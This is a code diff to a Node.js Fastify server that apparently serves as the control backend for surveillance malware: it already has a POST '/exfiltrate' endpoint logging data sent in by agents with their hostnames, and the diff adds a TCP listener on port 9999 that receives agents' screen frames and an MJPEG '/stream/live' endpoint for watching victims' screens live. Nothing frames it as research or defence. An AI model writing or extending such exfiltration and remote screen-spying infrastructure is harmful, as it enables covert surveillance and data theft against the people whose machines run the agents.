@@ -2,6 +2,7 @@ const fastify = require("fastify")({ logger: true });
 const Database = require('better-sqlite3');
 const path = require('path');
 const fs = require('fs');
+const net = require('net');
 
 const dbPath = path.join(__dirname, 'prisma', 'dev.db');
 if (!fs.existsSync(path.join(__dirname, 'prisma'))) {
@@ -9,6 +10,44 @@ if (!fs.existsSync(path.join(__dirname, 'prisma'))) {
 }
 
 const db = new Database(dbPath);
+
+// Store latest frames for each agent
+const agentFrames = new Map();
+
+// TCP Server for screen streaming
+const tcpServer = net.createServer((socket) => {
+  console.log('Agent connected for streaming');
+  let buffer = Buffer.alloc(0);
+  let expectedSize = 0;
+
+  socket.on('data', (data) => {
+    buffer = Buffer.concat([buffer, data]);
+    
+    while (true) {
+      if (expectedSize === 0) {
+        if (buffer.length < 4) break;
+        expectedSize = buffer.readUInt32BE(0);
+        buffer = buffer.slice(4);
+      }
+
+      if (buffer.length < expectedSize) break;
+      
+      const frameData = buffer.slice(0, expectedSize);
+      buffer = buffer.slice(expectedSize);
+      expectedSize = 0;
+
+      // For now, we use a generic 'live' key or we could handshake for hostname
+      // We'll update the first registered agent or use a placeholder
+      agentFrames.set('live', frameData);
+    }
+  });
+
+  socket.on('error', (err) => console.log('TCP Socket error:', err));
+});
+
+tcpServer.listen(9999, '0.0.0.0', () => {
+  console.log('TCP Stream Server listening on port 9999');
+});
 
 // Initialize DB
 db.exec(`
@@ -69,6 +108,29 @@ fastify.post("/exfiltrate", async (request, reply) => {
   db.prepare('INSERT INTO Log (type, content, agentHostname) VALUES (?, ?, ?)')
     .run(type, content, hostname);
   return { success: true };
+});
+
+// Stream Endpoint for MJPEG
+fastify.get("/stream/live", async (request, reply) => {
+  reply.raw.writeHead(200, {
+    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
+    'Cache-Control': 'no-cache',
+    'Connection': 'close',
+    'Pragma': 'no-cache'
+  });
+
+  const interval = setInterval(() => {
+    const frame = agentFrames.get('live');
+    if (frame) {
+      reply.raw.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.length}\r\n\r\n`);
+      reply.raw.write(frame);
+      reply.raw.write('\r\n');
+    }
+  }, 100);
+
+  request.raw.on('close', () => {
+    clearInterval(interval);
+  });
 });
 
 // API untuk Dashboard (Ambil semua data)
